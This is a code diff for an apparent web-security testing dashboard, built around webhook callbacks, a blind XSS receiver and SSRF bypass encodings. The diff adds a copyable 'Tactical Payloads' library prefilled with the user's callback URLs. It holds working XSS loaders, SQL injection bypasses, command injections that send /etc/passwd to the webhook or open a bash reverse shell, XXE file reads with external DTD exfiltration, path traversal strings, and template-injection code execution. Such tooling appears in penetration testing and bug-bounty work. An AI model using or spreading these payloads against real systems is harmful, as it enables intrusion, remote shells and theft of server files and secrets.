@@ -7,7 +7,7 @@ import {
   ExternalLink, Globe, Wifi, ShieldAlert, Play, Search, 
   AlertCircle, RefreshCw, ArrowLeft, ArrowUpRight, HelpCircle, 
   Database, User, Network, FileCode, Radio, Terminal, Zap,
-  ShieldCheck, Cpu
+  ShieldCheck, Cpu, BookOpen
 } from 'lucide-react';
 import styles from '@/styles/dashboard.module.css';
 
@@ -29,7 +29,6 @@ function generateSsrfBypasses(host) {
   } else if (cleanHost.toLowerCase() === 'localhost') {
     octets = [127, 0, 0, 1];
   } else {
-    // If it's a domain name (like google.com), we do unicode spoofing and redirection tricks
     const unicodeLookalikes = {
       'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ', 'h': 'ⓗ', 'i': 'ⓘ', 'j': 'ⓙ',
       'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ',
@@ -65,38 +64,33 @@ function generateSsrfBypasses(host) {
   // --- IPv4 Specific Bypasses ---
   const [a, b, c, d] = octets;
   const decimal = (a * 16777216) + (b * 65536) + (c * 256) + d;
+  const hexOctets = octets.map(o => '0x' + o.toString(16));
+  const octalOctets = octets.map(o => '0' + o.toString(8));
   
-  // 1. Decimal format
   results.push({
     category: 'Pure 32-Bit Decimal IP',
     payload: `http://${decimal}`,
     desc: 'Translates the standard octets into a single unified 32-bit integer.'
   });
 
-  // 2. Pure Hex
-  const hexOctets = octets.map(o => '0x' + o.toString(16));
   results.push({
     category: 'Standard Hexadecimal IP',
     payload: `http://${hexOctets.join('.')}`,
     desc: 'Each separate octet is encoded in base-16 hex format.'
   });
 
-  // 3. Compact Hex (Pure hex number)
   results.push({
     category: 'Compressed Hex Integer',
     payload: `http://0x${decimal.toString(16)}`,
     desc: 'The entire decimal integer converted to hex as a single raw value.'
   });
 
-  // 4. Octal format (leading zeros)
-  const octalOctets = octets.map(o => '0' + o.toString(8));
   results.push({
     category: 'Octal IP Encoding',
     payload: `http://${octalOctets.join('.')}`,
     desc: 'Octets are written in base-8 with leading zero indicator padding.'
   });
 
-  // 5. Short IPs (Linux/Curl shorteners)
   if (a === 127 && b === 0 && c === 0) {
     results.push({
       category: 'Short IP (Truncated Loopback)',
@@ -129,7 +123,6 @@ function generateSsrfBypasses(host) {
     });
   }
 
-  // 6. IPv6 Loopback forms
   results.push({
     category: 'IPv6 Compressed',
     payload: `http://[::1]`,
@@ -142,7 +135,6 @@ function generateSsrfBypasses(host) {
     desc: 'Dual-stack IPv4 embedded within IPv6 format.'
   });
 
-  // 7. Wildcard DNS Rebounding
   results.push({
     category: 'Nip.io Wildcard DNS',
     payload: `http://${a}.${b}.${c}.${d}.nip.io`,
@@ -163,7 +155,7 @@ export default function DashboardPage({ params }) {
   const id = resolvedParams.id;
 
   // Active Main Navigation Module state
-  const [activeTab, setActiveTab] = useState('OOB'); // 'OOB', 'XSS', 'SSRF'
+  const [activeTab, setActiveTab] = useState('OOB'); // 'OOB', 'XSS', 'SSRF', 'PAYLOADS'
 
   // --- OOB Webhook Ingestion states ---
   const [requests, setRequests] = useState([]);
@@ -201,6 +193,10 @@ export default function DashboardPage({ params }) {
   // --- SSRF Bypass states ---
   const [ssrfTarget, setSsrfTarget] = useState('127.0.0.1');
   const [ssrfBypasses, setSsrfBypasses] = useState([]);
+
+  // --- Payloads Cheat Sheet states ---
+  const [payloadsSearchQuery, setPayloadsSearchQuery] = useState('');
+  const [selectedPayloadCategory, setSelectedPayloadCategory] = useState('ALL');
 
   // Load origin on client side
   const [origin, setOrigin] = useState('');
@@ -494,6 +490,90 @@ export default function DashboardPage({ params }) {
     );
   });
 
+  // Payloads Cheat Sheet Library (Pre-Configured dynamically with custom URLs!)
+  const payloadsData = [
+    {
+      category: 'XSS',
+      title: 'Cross-Site Scripting (XSS)',
+      items: [
+        { title: 'Dynamic Blind XSS Script', code: `<script src="${xssPayloadUrl}"></script>`, desc: 'Ideal for standard script injections. Serves stealth exfiltration javascript.' },
+        { title: 'HTML Image tag fallback', code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, desc: 'Bypasses blacklists that block raw script tags. Uses ES6 imports.' },
+        { title: 'Iframe JavaScript source', code: `<iframe src="javascript:import('${xssPayloadUrl}')"></iframe>`, desc: 'Great for bypassing inline script filter rules inside comments/wikis.' },
+        { title: 'SVG Vector onLoad', code: `<svg onload="var s=document.createElement('script');s.src='${xssPayloadUrl}';document.head.appendChild(s);">`, desc: 'Fires instantly during DOM compilation without requiring external image failures.' },
+        { title: 'AngularJS expression bypass', code: `{{constructor.constructor('var s=document.createElement("script");s.src="${xssPayloadUrl}";document.head.appendChild(s);')()}}`, desc: 'Exploits client-side template injection to trigger XSS.' }
+      ]
+    },
+    {
+      category: 'SQLI',
+      title: 'SQL Injection (SQLi)',
+      items: [
+        { title: 'Classic Auth Bypass', code: `admin' --`, desc: 'Basic single-quote credential check bypass.' },
+        { title: 'OR Condition Auth Bypass', code: `' OR '1'='1`, desc: 'Succeeds query comparison validation.' },
+        { title: 'MySQL Time-Based Blind sleep', code: `'y UNION SELECT sleep(10)--`, desc: 'Tests SQL query latency for blind injections.' },
+        { title: 'PgSQL Time-Based sleep', code: `';SELECT pg_sleep(10)--`, desc: 'Trigger postgres delay thread sleep.' },
+        { title: 'Universal UNION payload', code: `' UNION SELECT NULL,NULL,NULL--`, desc: 'Fills column arrays to audit output schemas.' }
+      ]
+    },
+    {
+      category: 'RCE',
+      title: 'Command Injection (RCE / Blind)',
+      items: [
+        { title: 'Blind OOB Ingestion ping', code: `; ping -c 3 ${webhookUrl.replace('http://', '').replace('https://', '').split('/')[0]}`, desc: 'Instructs Unix target to ping back OOB host to prove execution.' },
+        { title: 'CURL exfiltration pipe', code: `; curl -F "file=@/etc/passwd" ${webhookUrl}`, desc: 'Exfiltrates local Unix system file content directly via POST parameter.' },
+        { title: 'Backtick subshell command', code: `\`id\``, desc: 'Executes command nested inside standard arguments.' },
+        { title: 'PowerShell download/exec string', code: `; powershell -c "Invoke-RestMethod -Uri '${webhookUrl}'"`, desc: 'Triggers web handshake on active Windows system.' },
+        { title: 'Inline bash TCP socket pipe', code: `; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`, desc: 'Standard inline backward terminal connector script.' }
+      ]
+    },
+    {
+      category: 'XXE',
+      title: 'XML External Entity (XXE)',
+      items: [
+        { title: 'Local File Traversal', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, desc: 'Reads local server files inside system parsing logs.' },
+        { title: 'Windows config file pull', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`, desc: 'Windows targets configuration extraction.' },
+        { title: 'Blind External DTD fetch', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "${webhookUrl}/poc.dtd"> %xxe;]><foo>bar</foo>`, desc: 'Pulls external malicious DTD rules to exfiltrate blind variables.' },
+        { title: 'SSRF internal scan hit', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`, desc: 'Queries internal intranet HTTP ports via XML engine.' }
+      ]
+    },
+    {
+      category: 'LFI',
+      title: 'Local File Inclusion (LFI)',
+      items: [
+        { title: 'Standard traversal Linux', code: `../../../../../../../../etc/passwd`, desc: 'Standard Unix path traversal.' },
+        { title: 'Standard traversal Windows', code: `..\..\..\..\..\..\..\..\windows\win.ini`, desc: 'Windows system configuration file pointer.' },
+        { title: 'PHP Base64 resource filter wrapper', code: `php://filter/convert.base64-encode/resource=index.php`, desc: 'Dumps source code of server script instead of executing it.' },
+        { title: 'Null byte termination (Legacy PHP)', code: `../../../../../../../../etc/passwd%00`, desc: 'Trims trailing string extensions in PHP <= 5.3.4.' },
+        { title: 'PHP input stream callback', code: `php://input`, desc: 'Enables injection of raw script parameters via POST payload data.' }
+      ]
+    },
+    {
+      category: 'SSTI',
+      title: 'Server-Side Template Injection (SSTI)',
+      items: [
+        { title: 'General expression verify', code: `${7*7}`, desc: 'Calculates 49 in Jinja, Twig, Velocity, etc.' },
+        { title: 'MVEL basic calculation', code: `#{7*7}`, desc: 'Common Java-based parsing arithmetic.' },
+        { title: 'Jinja2 Python configuration dump', code: `{{config.items()}}`, desc: 'Dumps application secrets and keys.' },
+        { title: 'Thymeleaf execute execution', code: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}__::.x`, desc: 'Triggers raw system OS command execution inside Thymeleaf templates.' },
+        { title: 'Smarty PHP trigger', code: `{Smarty_Internal_Write_File::writeFile('poc.php','<?php id; ?>')}`, desc: 'Smarty engine file drop payload.' }
+      ]
+    }
+  ];
+
+  // Filter Payloads list based on search and category
+  const filteredPayloads = payloadsData.filter(cat => {
+    return selectedPayloadCategory === 'ALL' || cat.category === selectedPayloadCategory;
+  }).map(cat => {
+    const items = cat.items.filter(item => {
+      const q = payloadsSearchQuery.toLowerCase();
+      return (
+        item.title.toLowerCase().includes(q) ||
+        item.code.toLowerCase().includes(q) ||
+        item.desc.toLowerCase().includes(q)
+      );
+    });
+    return { ...cat, items };
+  }).filter(cat => cat.items.length > 0);
+
   return (
     <div className={styles.dashboardLayout}>
       
@@ -511,6 +591,8 @@ export default function DashboardPage({ params }) {
                 ? `${requests.length} Callbacks` 
                 : activeTab === 'XSS' 
                 ? `${xssTriggers.length} XSS Hits` 
+                : activeTab === 'PAYLOADS'
+                ? 'Cheat Sheet'
                 : 'Utility'}
             </span>
           </div>
@@ -523,7 +605,7 @@ export default function DashboardPage({ params }) {
               title="Out-of-band Webhook Ingestor"
             >
               <Webhook size={13} />
-              OOB Ingestor
+              OOB
             </button>
             <button 
               onClick={() => setActiveTab('XSS')}
@@ -531,7 +613,7 @@ export default function DashboardPage({ params }) {
               title="Blind XSS Payload Receiver"
             >
               <ShieldAlert size={13} />
-              XSS Hunter
+              XSS
             </button>
             <button 
               onClick={() => setActiveTab('SSRF')}
@@ -539,14 +621,21 @@ export default function DashboardPage({ params }) {
               title="Stealth SSRF Bypass Generator"
             >
               <Zap size={13} />
-              SSRF Bypass
+              SSRF
+            </button>
+            <button 
+              onClick={() => setActiveTab('PAYLOADS')}
+              className={`${styles.moduleTabBtn} ${activeTab === 'PAYLOADS' ? styles.moduleTabBtnActive : ''}`}
+              title="Tactical Payloads Library"
+            >
+              <BookOpen size={13} />
+              Payloads
             </button>
           </div>
 
           {/* Module-Specific Sidebar Headers */}
           {activeTab === 'OOB' && (
             <>
-              {/* Search bar */}
               <div className={styles.searchBar}>
                 <Search size={14} className={styles.searchIcon} />
                 <input 
@@ -558,7 +647,6 @@ export default function DashboardPage({ params }) {
                 />
               </div>
 
-              {/* Filter Methods Tab */}
               <div style={{ display: 'flex', gap: '4px', overflowX: 'auto', paddingBottom: '4px' }}>
                 {['ALL', 'GET', 'POST', 'PUT', 'DELETE'].map(method => (
                   <button
@@ -595,7 +683,20 @@ export default function DashboardPage({ params }) {
 
           {activeTab === 'SSRF' && (
             <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
-              🎯 Type in a targeted hostname or IPv4 loopback address to generate stealth bypass variants instantly.
+              🎯 Enter target host below. Changes trigger real-time, pre-compiled bypass lists instantly.
+            </div>
+          )}
+
+          {activeTab === 'PAYLOADS' && (
+            <div className={styles.searchBar}>
+              <Search size={14} className={styles.searchIcon} />
+              <input 
+                type="text" 
+                placeholder="Search tactical payloads..."
+                value={payloadsSearchQuery}
+                onChange={(e) => setPayloadsSearchQuery(e.target.value)}
+                className={styles.searchInput}
+              />
             </div>
           )}
         </div>
@@ -697,6 +798,49 @@ export default function DashboardPage({ params }) {
                 <div>💡 <strong>TIP 1:</strong> Binary, Hex, and decimal addresses are interpreted natively by browser engines and server socket commands like cURL/python requests.</div>
                 <div>💡 <strong>TIP 2:</strong> `0.0.0.0` points back to the internal localhost router of Unix servers, which often completely evades standard string checks matching `127.0.0.1`.</div>
               </div>
+            </div>
+          )}
+
+          {activeTab === 'PAYLOADS' && (
+            <div style={{ padding: '16px 14px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+              <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
+                Categories
+              </span>
+              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI'].map(cat => (
+                <button
+                  key={cat}
+                  onClick={() => setSelectedPayloadCategory(cat)}
+                  style={{
+                    display: 'flex',
+                    alignItems: 'center',
+                    width: '100%',
+                    padding: '10px 12px',
+                    borderRadius: 'var(--radius-md)',
+                    background: selectedPayloadCategory === cat ? 'rgba(0, 242, 254, 0.08)' : 'transparent',
+                    border: selectedPayloadCategory === cat ? '1px solid rgba(0, 242, 254, 0.2)' : '1px solid transparent',
+                    color: selectedPayloadCategory === cat ? 'var(--color-primary)' : 'var(--text-muted)',
+                    fontSize: '0.8rem',
+                    fontWeight: '650',
+                    cursor: 'pointer',
+                    textAlign: 'left',
+                    transition: 'all 0.15s ease'
+                  }}
+                  onMouseEnter={(e) => {
+                    if (selectedPayloadCategory !== cat) {
+                      e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
+                      e.currentTarget.style.color = 'var(--text-main)';
+                    }
+                  }}
+                  onMouseLeave={(e) => {
+                    if (selectedPayloadCategory !== cat) {
+                      e.currentTarget.style.background = 'transparent';
+                      e.currentTarget.style.color = 'var(--text-muted)';
+                    }
+                  }}
+                >
+                  <span>{cat === 'ALL' ? '📂 View All Payloads' : `☣️ ${cat}`}</span>
+                </button>
+              ))}
             </div>
           )}
         </div>
@@ -1358,6 +1502,105 @@ export default function DashboardPage({ params }) {
                   </div>
                 ))}
               </div>
+            </div>
+
+          </div>
+        )}
+
+        {/* --- MODULE 4: TACTICAL PAYLOADS CHEAT SHEET --- */}
+        {activeTab === 'PAYLOADS' && (
+          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
+            
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
+              <BookOpen size={18} style={{ color: 'var(--color-primary)' }} />
+              <h2 style={{ fontSize: '1.2rem', fontWeight: '850', color: 'var(--text-main)' }}>TACTICAL PAYLOAD LIBRARY</h2>
+            </div>
+            <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '30px', maxWidth: '640px' }}>
+              A highly curated, searchable cheat sheet of vulnerability testing payloads. These payloads are **dynamically pre-compiled and configured** with your personal active webhook listener and XSS callback routing URLs! No manual editing needed.
+            </p>
+
+            {/* List categories dynamically */}
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '32px' }}>
+              {filteredPayloads.length === 0 ? (
+                <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>
+                  <HelpCircle size={32} style={{ margin: '0 auto 12px', color: 'var(--text-dark)' }} />
+                  <p>No payloads match your current search query.</p>
+                </div>
+              ) : (
+                filteredPayloads.map(cat => (
+                  <section key={cat.category} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
+                      <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--color-primary)' }}></span>
+                      <h3 style={{ fontSize: '0.95rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                        {cat.title}
+                      </h3>
+                    </div>
+
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                      {cat.items.map((item, idx) => (
+                        <div 
+                          key={idx}
+                          style={{
+                            padding: '18px',
+                            background: 'rgba(255,255,255,0.01)',
+                            border: '1px solid var(--border-light)',
+                            borderRadius: 'var(--radius-lg)',
+                            display: 'flex',
+                            flexDirection: 'column',
+                            gap: '10px'
+                          }}
+                        >
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                            <h4 style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
+                              {item.title}
+                            </h4>
+                            <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
+                              {cat.category}-00{idx + 1}
+                            </span>
+                          </div>
+
+                          <div 
+                            style={{ 
+                              display: 'flex', 
+                              alignItems: 'center', 
+                              background: '#040608', 
+                              border: '1px solid var(--border-medium)', 
+                              borderRadius: 'var(--radius-md)', 
+                              padding: '12px 14px',
+                              gap: '12px' 
+                            }}
+                          >
+                            <span 
+                              style={{ 
+                                color: '#00e676', 
+                                fontFamily: 'monospace', 
+                                fontSize: '0.85rem', 
+                                flex: 1, 
+                                whiteSpace: 'nowrap', 
+                                overflowX: 'auto',
+                                paddingBottom: '2px'
+                              }}
+                            >
+                              {item.code}
+                            </span>
+                            <button 
+                              onClick={() => handleCopy(item.code, `${cat.category}-${idx}`)}
+                              className={styles.copyBtn}
+                              style={{ flexShrink: '0' }}
+                            >
+                              {copiedText === `${cat.category}-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                            </button>
+                          </div>
+
+                          <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
+                            {item.desc}
+                          </p>
+                        </div>
+                      ))}
+                    </div>
+                  </section>
+                ))
+              )}
             </div>
 
           </div>
